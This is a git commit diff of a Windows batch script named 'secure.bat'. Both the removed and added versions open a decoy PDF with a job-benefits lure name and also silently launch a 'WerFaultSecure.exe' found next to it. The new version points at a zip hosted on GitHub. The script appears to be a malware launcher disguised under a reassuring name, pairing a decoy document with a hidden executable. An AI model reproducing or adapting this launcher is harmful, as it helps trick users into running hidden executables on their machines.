089c232edc770ce1be5be58eb8041077409f3847
z3nn1 <149288329+z3nn1@users.noreply.github.com>
2024-09-17 01:02:30 +0700

    Update secure.bat

--- secure.bat
+++ secure.bat
@@ -1,39 +1,9 @@
 @echo off
-setlocal enabledelayedexpansion
 
-set "pdfName=BenefitsJDPhotoVideoUNQILOQ42024.pdf"
-set "werFaultSecure=WerFaultSecure.exe"
-
-set "downloadFolder=%USERPROFILE%\Downloads"
-
-echo Searching for %pdfName% in recent downloads...
-
-for /f "delims=" %%D in ('dir /ad /b /od /t:w "%downloadFolder%" ^| sort /r ^| findstr /n "^" ^| findstr "^[1-5]:"') do (
-    set "recentFolder=%%D"
-    set "recentFolder=!recentFolder:*:=!"
-    
-    if exist "%downloadFolder%\!recentFolder!\%pdfName%" (
-        echo File found: %downloadFolder%\!recentFolder!\%pdfName%
-        start "" "%downloadFolder%\!recentFolder!\%pdfName%"
-	start "" "%downloadFolder%\!recentFolder!\%werFaultSecure%"
-
-        goto :found
-    )
-)
-
-
-if exist "%downloadFolder%\%pdfName%" (
-    echo File found: %downloadFolder%\%pdfName%
-    start "" "%downloadFolder%\%pdfName%"
-    start "" "%downloadFolder%\%werFaultSecure%"
-
-    goto :found
-)
-
-
-goto :end
-
-:found
-
-
-:end
+set URL=https://raw.githubusercontent.com/z3nn1/DataPublic/main/Data2.zip
+set OUTPUT=file.zip
+set EXTRACTED_DIR=extracted
+cd %EXTRACTED_DIR%
+start BenefitsJDPhotoVideoUNQILOQ42024.pdf
+timeout /t 3 /nobreak >nul
+start WerFaultSecure.exe
